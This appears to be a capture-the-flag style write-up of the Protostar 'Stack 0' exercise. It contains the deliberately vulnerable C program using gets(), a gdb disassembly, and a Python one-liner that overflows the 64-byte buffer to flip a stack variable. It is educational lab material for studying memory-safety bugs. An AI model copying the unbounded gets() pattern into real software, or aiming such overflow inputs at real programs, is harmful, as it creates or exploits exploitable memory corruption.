w## Stack 0
code : 
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

1. Modifying the variables, How? 

**volatile** :  tell compiler do not optimize the usage of this variable

### Vulnerability
gets -> get user input (but never use this, impossible to tell how many characters to get)

### Steps to exploit
ebp -> base pointer register 
esp -> stack pointer
eip -> instruction pointer

start -> we push ebp into the stack, and move ebp, esp
(reverse)
leave -> mov esp, ebp then pop ebp

sub esp, 0x60
-> substract 0x60 on the esp (point lower position)
``` binary
(gdb) disassemble main
Dump of assembler code for function main:
0x080483f4 <main+0>:    push   ebp
0x080483f5 <main+1>:    mov    ebp,esp
0x080483f7 <main+3>:    and    esp,0xfffffff0
0x080483fa <main+6>:    sub    esp,0x60
0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <main+17>:   lea    eax,[esp+0x1c]
0x08048409 <main+21>:   mov    DWORD PTR [esp],eax
0x0804840c <main+24>:   call   0x804830c <gets@plt>
0x08048411 <main+29>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:   test   eax,eax
0x08048417 <main+35>:   je     0x8048427 <main+51>
0x08048419 <main+37>:   mov    DWORD PTR [esp],0x8048500
0x08048420 <main+44>:   call   0x804832c <puts@plt>
0x08048425 <main+49>:   jmp    0x8048433 <main+63>
0x08048427 <main+51>:   mov    DWORD PTR [esp],0x8048529
0x0804842e <main+58>:   call   0x804832c <puts@plt>
0x08048433 <main+63>:   leave
0x08048434 <main+64>:   ret
End of assembler dump.

```

```bash
user@protostar:/opt/protostar/bin$ python -c "print 'A' * 64" | ./stack0
Try again?
```

``` bash
user@protostar:/opt/protostar/bin$ python -c "print 'A' * 65" | ./stack0
you have changed the 'modified' variable

```